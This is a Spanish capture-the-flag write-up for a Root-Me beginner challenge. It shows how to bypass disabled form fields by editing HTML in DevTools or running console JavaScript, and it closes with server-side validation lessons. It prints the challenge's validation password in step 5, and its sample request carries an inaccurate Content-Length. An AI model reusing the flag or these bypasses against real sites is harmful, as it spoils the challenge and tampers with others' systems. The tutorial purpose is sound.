🔒 Root-Me Challenge: HTML - disabled buttons
📋 Información General
Categoría	Web - Client Side
Dificultad	Fácil (1/5)
Puntos	5
Validaciones	173,594 challengers
Tasa de éxito	44%
🎯 Objetivo del Reto

    "Este formulario está desactivado y no puede ser utilizado. Depende de ti encontrar la manera de usarlo."

El reto consiste en una página web con un formulario que tiene sus campos deshabilitados (disabled). Debemos encontrar la forma de activarlos y enviar la petición para obtener la contraseña de validación.
🔍 Fase de Reconocimiento
1. Análisis Inicial

Al acceder a la página, nos encontramos con:
html

<h1>Website temporarily closed.</h1>
<hr>
<form action="" method="post" name="authform">
    <div>
        <input disabled type="text" name="auth-login" value="" />
        <input disabled type="submit" value="Member access" name="authbutton" />
    </div>
</form>

Observaciones clave:

    El campo de texto tiene el atributo disabled

    El botón de envió también tiene disabled

    El formulario usa el método POST

    No hay validación aparente en el lado del servidor para estos atributos

2. Hipótesis

El atributo disabled es puramente client-side (lado del cliente). Esto significa que:

    Solo afecta a la interacción del usuario en el navegador

    No impide que se envíe una petición HTTP si se elimina/modifica

    El servidor probablemente procesa la petición sin verificar este atributo

🛠️ Fase de Explotación
Método 1: Inspección y Edición Directa (La más rápida)

Paso 1: Abrir las herramientas de desarrollador

    Windows/Linux: F12 o Ctrl + Shift + I

    macOS: Cmd + Opt + I

Paso 2: Localizar el elemento HTML

Navegar en el inspector hasta encontrar el formulario:

![Estructura del formulario]
html

<form action="" method="post" name="authform">
    <div>
        <input disabled type="text" name="auth-login" value="" />
        <input disabled type="submit" value="Member access" name="authbutton" />
    </div>
</form>

Paso 3: Eliminar los atributos disabled

Hacer doble clic en el código HTML y eliminar disabled de ambos campos:
html

<!-- Antes -->
<input disabled type="text" name="auth-login" value="" />

<!-- Después -->
<input type="text" name="auth-login" value="" />

html

<!-- Antes -->
<input disabled type="submit" value="Member access" name="authbutton" />

<!-- Después -->
<input type="submit" value="Member access" name="authbutton" />

Paso 4: Enviar el formulario

    Rellenar el campo de texto con cualquier valor (ej: "test")

    Hacer clic en "Member access"

Paso 5: ¡Obtener la contraseña!
html

<div class="success">
    Member access granted! The validation password is HTMLCantStopYou
</div>

Método 2: Consola JavaScript (Alternativa)

Si prefieres usar la consola, puedes ejecutar:
javascript

// Seleccionar y habilitar el campo de texto
document.querySelector('input[name="auth-login"]').disabled = false;

// Seleccionar y habilitar el botón
document.querySelector('input[name="authbutton"]').disabled = false;

// Opcional: Rellenar el campo automáticamente
document.querySelector('input[name="auth-login"]').value = "hacker";

// Enviar el formulario
document.querySelector('form[name="authform"]').submit();

Método 3: Modificación de Atributos (Alternativa)

También se puede usar removeAttribute():
javascript

// Eliminar el atributo disabled
document.querySelector('input[name="auth-login"]').removeAttribute('disabled');
document.querySelector('input[name="authbutton"]').removeAttribute('disabled');

📊 Análisis Técnico
¿Por qué funcionó?

El flujo de la petición HTTP es el siguiente:
text

Cliente (Navegador)           Servidor
     |                           |
     | 1. GET /challenge/        |
     |-------------------------->|
     |                           | 2. HTML con disabled
     |<--------------------------|
     |                           |
     | 3. Usuario modifica HTML  |
     |    (elimina disabled)     |
     |                           |
     | 4. POST /challenge/       |
     |    auth-login=test        |
     |-------------------------->|
     |                           | 5. Procesa la petición
     |                           |    (no verifica disabled)
     | 6. Respuesta exitosa      |
     |<--------------------------|
     |                           |

Vulnerabilidad Identificada

Falta de validación en el servidor

El servidor confía ciegamente en que el cliente respetará las restricciones del formulario. Esto es un error de seguridad común conocido como "Client-Side Security" o "Trusting Client-Side Controls".
Clasificación CWE

    CWE-602: Client-Side Enforcement of Server-Side Security

    CWE-20: Improper Input Validation

🧪 Validación de la Solución
Solicitud HTTP Original
http

POST /?page=externe_header HTTP/1.1
Host: www.root-me.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

auth-login=test&authbutton=Member+access

Respuesta del Servidor
http

HTTP/1.1 200 OK
Content-Type: text/html

<html>
    <head>...</head>
    <body>
        <h1>Website temporarily closed.</h1>
        <hr>
        <div class="success">
            Member access granted! 
            The validation password is *****************
        </div>
    </body>
</html>

🏆 Resultado Final
Contraseña de Validación
text

*********************

Lecciones Aprendidas

Concepto			Explicación
Seguridad en capas		Nunca confiar solo en la validación del cliente
Atributo disabled		Solo afecta la UI, no la lógica del servidor
Validación del servidor		Siempre validar los datos en el backend
Herramientas de desarrollo	F12 es la primera herramienta de un pentester
